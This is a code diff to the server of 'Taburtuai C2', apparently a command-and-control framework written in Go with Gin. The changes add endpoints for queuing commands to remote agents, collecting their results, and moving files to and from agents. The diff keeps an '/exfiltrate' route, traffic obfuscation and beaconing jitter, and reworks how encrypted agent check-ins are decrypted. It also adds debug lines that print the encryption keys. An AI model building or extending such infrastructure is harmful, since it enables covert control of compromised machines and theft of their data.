@@ -4,35 +4,40 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-//	"net/http"
+	"net/http"
+
+	//	"net/http"
 	"os"
 	"os/signal"
-	"strconv"
+
+	//	"sort"        // Add this
+	"strconv" // Add this
 	"syscall"
 	"time"
 
 	"github.com/gin-gonic/gin"
+	// "github.com/google/uuid"  // Add this (install: go get github.com/google/uuid)
 )
 
 // Server configuration
 type ServerConfig struct {
-	Port           string
-	LogLevel       LogLevel
-	LogDir         string
-	EncryptionKey  string
-	SecondaryKey   string
-	AuthEnabled    bool
-	APIKey         string
-	MaxAgents      int
-	AgentTimeout   time.Duration
+	Port          string
+	LogLevel      LogLevel
+	LogDir        string
+	EncryptionKey string
+	SecondaryKey  string
+	AuthEnabled   bool
+	APIKey        string
+	MaxAgents     int
+	AgentTimeout  time.Duration
 }
 
 // Enhanced server structure
 type TaburtuaiServer struct {
-	config    *ServerConfig
-	router    *gin.Engine
-	crypto    *CryptoManager
-	monitor   *AgentMonitor
+	config     *ServerConfig
+	router     *gin.Engine
+	crypto     *CryptoManager
+	monitor    *AgentMonitor
 	obfuscator *TrafficObfuscator
 }
 
@@ -65,6 +70,11 @@ func NewTaburtuaiServer(config *ServerConfig) (*TaburtuaiServer, error) {
 		return nil, fmt.Errorf("failed to initialize logger: %v", err)
 	}
 
+	// DEBUG: Log keys being used
+	fmt.Printf("[SERVER] Using encryption keys:\n")
+	fmt.Printf("[SERVER] Primary: %s\n", config.EncryptionKey)
+	fmt.Printf("[SERVER] Secondary: %s\n", config.SecondaryKey)
+
 	// Initialize crypto manager
 	crypto, err := NewCryptoManager(config.EncryptionKey, config.SecondaryKey)
 	if err != nil {
@@ -73,9 +83,9 @@ func NewTaburtuaiServer(config *ServerConfig) (*TaburtuaiServer, error) {
 
 	// Initialize agent monitor
 	monitor := NewAgentMonitor(
-		30*time.Second, // heartbeat window
+		30*time.Second,      // heartbeat window
 		config.AgentTimeout, // offline window
-		10*time.Second, // check interval
+		10*time.Second,      // check interval
 	)
 
 	// Initialize traffic obfuscator
@@ -92,6 +102,32 @@ func NewTaburtuaiServer(config *ServerConfig) (*TaburtuaiServer, error) {
 	return server, nil
 }
 
+// Tambahkan middleware untuk debug
+func (s *TaburtuaiServer) debugMiddleware() gin.HandlerFunc {
+	return func(c *gin.Context) {
+		// Log semua requests
+		LogInfo(SYSTEM, fmt.Sprintf("Request: %s %s from %s",
+			c.Request.Method, c.Request.URL.Path, c.ClientIP()), "")
+
+		c.Next()
+
+		// Log response status
+		LogInfo(SYSTEM, fmt.Sprintf("Response: %d for %s %s",
+			c.Writer.Status(), c.Request.Method, c.Request.URL.Path), "")
+	}
+}
+
+func (s *TaburtuaiServer) errorRecoveryMiddleware() gin.HandlerFunc {
+	return gin.CustomRecovery(func(c *gin.Context, recovered interface{}) {
+		LogError(SYSTEM, fmt.Sprintf("Panic recovered: %v", recovered), "")
+
+		c.JSON(500, APIResponse{
+			Success: false,
+			Error:   "Internal server error",
+		})
+	})
+}
+
 // setupRoutes configures all API routes
 func (s *TaburtuaiServer) setupRoutes() {
 	// Set Gin mode
@@ -106,6 +142,8 @@ func (s *TaburtuaiServer) setupRoutes() {
 	// Middleware
 	s.router.Use(gin.Logger())
 	s.router.Use(gin.Recovery())
+	s.router.Use(s.errorRecoveryMiddleware())
+	s.router.Use(s.debugMiddleware())
 	s.router.Use(s.corsMiddleware())
 	s.router.Use(s.authMiddleware())
 	s.router.Use(s.loggingMiddleware())
@@ -117,26 +155,43 @@ func (s *TaburtuaiServer) setupRoutes() {
 		api.GET("/agents", s.listAgents)
 		api.GET("/agents/:id", s.getAgent)
 		api.DELETE("/agents/:id", s.removeAgent)
-		
+
 		// Agent communication
 		api.POST("/checkin", s.agentCheckin)
 		api.GET("/command/:id", s.getCommand)
 		api.POST("/result", s.submitResult)
-		
+
+		// Download & Upload
+		api.POST("/agent/:id/upload", s.uploadToAgent)
+		api.POST("/agent/:id/download", s.downloadFromAgent)
+
 		// File operations
-		api.POST("/upload", s.uploadFile)
-		api.GET("/download/:id/*filepath", s.downloadFile)
+		// api.POST("/upload", s.uploadFile)
+		// api.GET("/download/:id/*filepath", s.downloadFile)
 		api.POST("/exfiltrate", s.exfiltrateFile)
-		
+
 		// Task scheduling
 		api.POST("/schedule", s.scheduleTask)
 		api.GET("/tasks/:id", s.getTasks)
-		
+
 		// Monitoring and stats
 		api.GET("/stats", s.getStats)
 		api.GET("/health", s.healthCheck)
 		api.GET("/logs", s.getLogs)
 		api.GET("/history/:id", s.getAgentHistory)
+
+		// Command execution
+		api.POST("/command", s.executeCommand)
+		api.GET("/command/:id/next", s.getNextCommand)
+		api.POST("/command/result", s.submitCommandResult)
+		api.GET("/command/:id/status", s.getCommandStatus)
+
+		// Agent command management
+		api.GET("/agent/:id/commands", s.getAgentCommands)
+		api.DELETE("/agent/:id/queue", s.clearAgentQueue)
+
+		// Queue statistics
+		api.GET("/queue/stats", s.getQueueStats)
 	}
 
 	// Legacy endpoints for backward compatibility
@@ -160,12 +215,12 @@ func (s *TaburtuaiServer) corsMiddleware() gin.HandlerFunc {
 		c.Header("Access-Control-Allow-Origin", "*")
 		c.Header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
 		c.Header("Access-Control-Allow-Headers", "Origin, Content-Type, Authorization")
-		
+
 		if c.Request.Method == "OPTIONS" {
 			c.AbortWithStatus(204)
 			return
 		}
-		
+
 		c.Next()
 	}
 }
@@ -211,18 +266,18 @@ func (s *TaburtuaiServer) loggingMiddleware() gin.HandlerFunc {
 	return func(c *gin.Context) {
 		start := time.Now()
 		clientIP := c.ClientIP()
-		
+
 		c.Next()
-		
+
 		latency := time.Since(start)
 		statusCode := c.Writer.Status()
-		
-		LogInfo(SYSTEM, fmt.Sprintf("%s %s %d %v", 
+
+		LogInfo(SYSTEM, fmt.Sprintf("%s %s %d %v",
 			c.Request.Method, c.Request.URL.Path, statusCode, latency), "")
-		
+
 		// Log suspicious activity
 		if statusCode >= 400 {
-			LogError(AUDIT, fmt.Sprintf("HTTP %d from %s: %s %s", 
+			LogError(AUDIT, fmt.Sprintf("HTTP %d from %s: %s %s",
 				statusCode, clientIP, c.Request.Method, c.Request.URL.Path), "")
 		}
 	}
@@ -231,7 +286,7 @@ func (s *TaburtuaiServer) loggingMiddleware() gin.HandlerFunc {
 // API handlers
 func (s *TaburtuaiServer) listAgents(c *gin.Context) {
 	agents := s.monitor.GetAllAgents()
-	
+
 	var agentSummaries []AgentSummary
 	for _, agent := range agents {
 		summary := AgentSummary{
@@ -244,12 +299,12 @@ func (s *TaburtuaiServer) listAgents(c *gin.Context) {
 		}
 		agentSummaries = append(agentSummaries, summary)
 	}
-	
+
 	response := AgentListResponse{
 		Agents: agentSummaries,
 		Total:  len(agentSummaries),
 	}
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    response,
@@ -258,7 +313,7 @@ func (s *TaburtuaiServer) listAgents(c *gin.Context) {
 
 func (s *TaburtuaiServer) getAgent(c *gin.Context) {
 	agentID := c.Param("id")
-	
+
 	agent, exists := s.monitor.GetAgent(agentID)
 	if !exists {
 		c.JSON(404, APIResponse{
@@ -267,7 +322,7 @@ func (s *TaburtuaiServer) getAgent(c *gin.Context) {
 		})
 		return
 	}
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    agent,
@@ -276,9 +331,9 @@ func (s *TaburtuaiServer) getAgent(c *gin.Context) {
 
 func (s *TaburtuaiServer) removeAgent(c *gin.Context) {
 	agentID := c.Param("id")
-	
+
 	s.monitor.RemoveAgent(agentID)
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Message: fmt.Sprintf("Agent %s removed", agentID),
@@ -288,50 +343,83 @@ func (s *TaburtuaiServer) removeAgent(c *gin.Context) {
 func (s *TaburtuaiServer) agentCheckin(c *gin.Context) {
 	var checkinData map[string]interface{}
 	if err := c.ShouldBindJSON(&checkinData); err != nil {
-		c.JSON(400, APIResponse{
+		c.JSON(http.StatusBadRequest, APIResponse{ // Menggunakan http.StatusBadRequest
 			Success: false,
-			Error:   "Invalid checkin data",
+			Error:   "Invalid checkin data format: " + err.Error(),
 		})
 		return
 	}
-	
-	// Decrypt checkin data if encrypted
-	if encryptedData, ok := checkinData["encrypted"].(string); ok {
-		decrypted, err := s.crypto.DecryptData(encryptedData)
+
+	// --- MODIFIKASI UTAMA DI SINI ---
+	// Periksa apakah data terenkripsi menggunakan key "encrypted_payload"
+	if encryptedPayload, ok := checkinData["encrypted_payload"].(string); ok && s.crypto != nil {
+		LogInfo(SYSTEM, "Received checkin data with 'encrypted_payload', decrypting...", "") //
+
+		decrypted, err := s.crypto.DecryptData(encryptedPayload) //
 		if err != nil {
-			c.JSON(400, APIResponse{
+			LogError(SYSTEM, "Failed to decrypt checkin data: "+err.Error(), "") //
+			c.JSON(http.StatusBadRequest, APIResponse{
 				Success: false,
-				Error:   "Failed to decrypt checkin data",
+				Error:   "Failed to decrypt checkin data: " + err.Error(),
 			})
 			return
 		}
-		
-		if err := json.Unmarshal(decrypted, &checkinData); err != nil {
-			c.JSON(400, APIResponse{
+
+		// Penting: Unmarshal data yang sudah didekripsi ke dalam map baru
+		// atau timpa checkinData agar berisi data agent yang sebenarnya.
+		var decryptedAgentData map[string]interface{}
+		if err := json.Unmarshal(decrypted, &decryptedAgentData); err != nil {
+			LogError(SYSTEM, "Failed to parse decrypted agent data: "+err.Error(), "") //
+			c.JSON(http.StatusBadRequest, APIResponse{
 				Success: false,
-				Error:   "Failed to parse decrypted data",
+				Error:   "Failed to parse decrypted agent data: " + err.Error(),
 			})
 			return
 		}
+		checkinData = decryptedAgentData                                                    // Gunakan data yang sudah didekripsi untuk proses selanjutnya
+		LogInfo(SYSTEM, "Checkin data decrypted successfully from 'encrypted_payload'", "") //
+	} else if _, encryptedKeyExists := checkinData["encrypted"]; encryptedKeyExists {
+		// Tambahkan log jika key "encrypted" yang lama masih terdeteksi, untuk debugging
+		LogWarn(SYSTEM, "Received checkin data with deprecated 'encrypted' key. Please ensure agent uses 'encrypted_payload'.", "") //
+		// Jika Anda masih ingin mendukung key "encrypted" untuk sementara:
+		// (Logika dekripsi untuk key "encrypted" bisa ditambahkan di sini jika perlu)
+		// Namun, untuk konsistensi, sebaiknya agent diupdate.
 	}
-	
+	// --- AKHIR MODIFIKASI UTAMA ---
+
 	// Register/update agent
-	s.monitor.RegisterAgent(checkinData)
-	
-	agentID := checkinData["id"].(string)
-	LogAgentActivity(agentID, "checkin", c.ClientIP())
-	
+	// Sekarang checkinData seharusnya berisi map agent info yang sebenarnya (jika terenkripsi dan berhasil didekripsi)
+	// atau map yang dikirim plaintext oleh agent.
+	s.monitor.RegisterAgent(checkinData) //
+
+	agentID := ""
+	if id, ok := checkinData["id"].(string); ok { // Ini seharusnya berhasil sekarang
+		agentID = id
+	} else {
+		// Jika ID masih tidak ada setelah potensial dekripsi, ada masalah lain.
+		// Log ini, meskipun RegisterAgent juga akan melakukan validasi.
+		LogError(SYSTEM, "Agent ID missing or not a string in checkinData after potential decryption.", "") //
+	}
+
+	LogAgentActivity(agentID, "checkin", c.ClientIP()) //
+
 	// Return any pending commands or config updates
+	// Server dapat mengirimkan konfigurasi atau perintah awal di sini jika perlu
 	response := map[string]interface{}{
 		"status": "ok",
-		"config": map[string]interface{}{
-			"interval": 30,
-			"jitter":   0.3,
+		"config": map[string]interface{}{ // Contoh konfigurasi yang bisa dikirim ke agent
+			"interval": s.config.AgentTimeout.Seconds() / 10, // Contoh: beacon interval
+			"jitter":   0.3,                                  // Contoh: jitter
 		},
+		// "commands": []interface{}{}, // Bisa juga langsung mengirim perintah awal
 	}
-	
-	c.JSON(200, APIResponse{
+
+	// Pertimbangkan untuk mengenkripsi respons ini jika agent mengharapkannya
+	// (Saat ini agent belum mengharapkan respons checkin terenkripsi)
+
+	c.JSON(http.StatusOK, APIResponse{ // Menggunakan http.StatusOK
 		Success: true,
+		Message: "Checkin successful", // Tambahkan pesan sukses
 		Data:    response,
 	})
 }
@@ -339,17 +427,17 @@ func (s *TaburtuaiServer) agentCheckin(c *gin.Context) {
 func (s *TaburtuaiServer) getStats(c *gin.Context) {
 	stats := s.monitor.GetStats()
 	logStats := GlobalLogger.GetStats()
-	
+
 	combinedStats := map[string]interface{}{
 		"agents": stats,
 		"logs":   logStats,
 		"server": map[string]interface{}{
-			"uptime":    time.Since(serverStartTime).String(),
-			"version":   "2.0.0-phase1",
-			"features":  []string{"encryption", "monitoring", "logging", "cli"},
+			"uptime":   time.Since(serverStartTime).String(),
+			"version":  "2.0.0-phase1",
+			"features": []string{"encryption", "monitoring", "logging", "cli"},
 		},
 	}
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    combinedStats,
@@ -366,7 +454,7 @@ func (s *TaburtuaiServer) healthCheck(c *gin.Context) {
 			"crypto":  "ok",
 		},
 	}
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    health,
@@ -379,9 +467,9 @@ func (s *TaburtuaiServer) getLogs(c *gin.Context) {
 	if err != nil {
 		count = 100
 	}
-	
+
 	logs := GlobalLogger.GetRecentLogs(count)
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    logs,
@@ -395,9 +483,9 @@ func (s *TaburtuaiServer) getAgentHistory(c *gin.Context) {
 	if err != nil {
 		count = 50
 	}
-	
+
 	history := GlobalLogger.GetCommandHistory(agentID, count)
-	
+
 	c.JSON(200, APIResponse{
 		Success: true,
 		Data:    history,
@@ -410,7 +498,7 @@ func (s *TaburtuaiServer) legacyPing(c *gin.Context) {
 	if agentID == "" {
 		agentID = generateAgentID()
 	}
-	
+
 	// Create basic agent data
 	agentData := map[string]interface{}{
 		"id":       agentID,
@@ -418,26 +506,26 @@ func (s *TaburtuaiServer) legacyPing(c *gin.Context) {
 		"username": c.Query("username"),
 		"os":       c.Query("os"),
 	}
-	
+
 	s.monitor.RegisterAgent(agentData)
-	
+
 	c.String(200, "pong")
 }
 
 func (s *TaburtuaiServer) legacyCommand(c *gin.Context) {
 	agentID := c.Query("id")
 	command := c.Query("cmd")
-	
+
 	if agentID == "" || command == "" {
 		c.String(400, "Missing agent ID or command")
 		return
 	}
-	
+
 	// Record command
 	start := time.Now()
 	LogCommand(agentID, command, "", true)
 	s.monitor.RecordCommand(agentID, command, true, time.Since(start))
-	
+
 	c.String(200, "Command queued")
 }
 
@@ -468,7 +556,7 @@ func (s *TaburtuaiServer) legacySchedule(c *gin.Context) {
 
 func (s *TaburtuaiServer) simpleDashboard(c *gin.Context) {
 	stats := s.monitor.GetStats()
-	
+
 	html := `<!DOCTYPE html>
 <html>
 <head>
@@ -538,11 +626,11 @@ func (s *TaburtuaiServer) simpleDashboard(c *gin.Context) {
     </div>
 </body>
 </html>`
-	
+
 	c.Header("Content-Type", "text/html")
-	c.String(200, html, 
+	c.String(200, html,
 		stats["total_agents"],
-		stats["online_agents"], 
+		stats["online_agents"],
 		stats["offline_agents"],
 		stats["total_commands"],
 		s.config.Port,
@@ -551,7 +639,7 @@ func (s *TaburtuaiServer) simpleDashboard(c *gin.Context) {
 
 func (s *TaburtuaiServer) dashboard(c *gin.Context) {
 	stats := s.monitor.GetStats()
-	
+
 	data := gin.H{
 		"title":          "Taburtuai C2 Dashboard",
 		"total_agents":   stats["total_agents"],
@@ -562,7 +650,7 @@ func (s *TaburtuaiServer) dashboard(c *gin.Context) {
 		"uptime":         time.Since(serverStartTime).Round(time.Second).String(),
 		"version":        "v2.0 - Phase 1 Enhanced",
 	}
-	
+
 	c.HTML(200, "dashboard.html", data)
 }
 
@@ -599,22 +687,22 @@ func (s *TaburtuaiServer) getTasks(c *gin.Context) {
 func (s *TaburtuaiServer) Start() error {
 	// Start monitoring
 	s.monitor.Start()
-	
+
 	LogInfo(SYSTEM, fmt.Sprintf("Starting Taburtuai C2 Server on port %s", s.config.Port), "")
-	LogInfo(SYSTEM, fmt.Sprintf("Features: encryption=%t, auth=%t, monitoring=true", 
+	LogInfo(SYSTEM, fmt.Sprintf("Features: encryption=%t, auth=%t, monitoring=true",
 		s.crypto != nil, s.config.AuthEnabled), "")
-	
+
 	return s.router.Run(":" + s.config.Port)
 }
 
 // Stop gracefully stops the server
 func (s *TaburtuaiServer) Stop() {
 	LogInfo(SYSTEM, "Stopping Taburtuai C2 Server", "")
-	
+
 	if s.monitor != nil {
 		s.monitor.Stop()
 	}
-	
+
 	if GlobalLogger != nil {
 		GlobalLogger.Close()
 	}
@@ -630,7 +718,7 @@ var serverStartTime time.Time
 // Main function
 func main() {
 	serverStartTime = time.Now()
-	
+
 	// Load configuration
 	config := &ServerConfig{
 		Port:          getEnvOrDefault("PORT", "8080"),
@@ -643,7 +731,7 @@ func main() {
 		MaxAgents:     100,
 		AgentTimeout:  5 * time.Minute,
 	}
-	
+
 	// Parse log level from environment
 	if logLevelStr := os.Getenv("LOG_LEVEL"); logLevelStr != "" {
 		switch logLevelStr {
@@ -659,24 +747,37 @@ func main() {
 			config.LogLevel = CRITICAL
 		}
 	}
-	
+
 	// Create server
 	server, err := NewTaburtuaiServer(config)
 	if err != nil {
 		log.Fatalf("Failed to create server: %v", err)
 	}
-	
+
+	// Initialize command queue explicitly
+	if commandQueue == nil {
+		commandQueue = &CommandQueue{
+			queues:  make(map[string][]*Command),
+			active:  make(map[string]*Command),
+			results: make(map[string]*Command),
+		}
+		fmt.Println("Command queue initialized")
+	}
+
+	// Start command queue cleanup routine (Phase 2A addition)
+	startCommandQueueCleanup()
+
 	// Setup graceful shutdown
 	c := make(chan os.Signal, 1)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-	
+
 	go func() {
 		<-c
 		fmt.Println("\nShutting down server...")
 		server.Stop()
 		os.Exit(0)
 	}()
-	
+
 	// Print startup information
 	fmt.Printf(`
 ╔══════════════════════════════════════════════════════════════╗
@@ -696,9 +797,9 @@ func main() {
 ║ Auth: %s                                                     ║
 ╚══════════════════════════════════════════════════════════════╝
 
-`, config.Port, config.LogDir, 
-	map[bool]string{true: "Enabled", false: "Disabled"}[config.AuthEnabled])
-	
+`, config.Port, config.LogDir,
+		map[bool]string{true: "Enabled", false: "Disabled"}[config.AuthEnabled])
+
 	// Start server
 	if err := server.Start(); err != nil {
 		log.Fatalf("Server failed to start: %v", err)
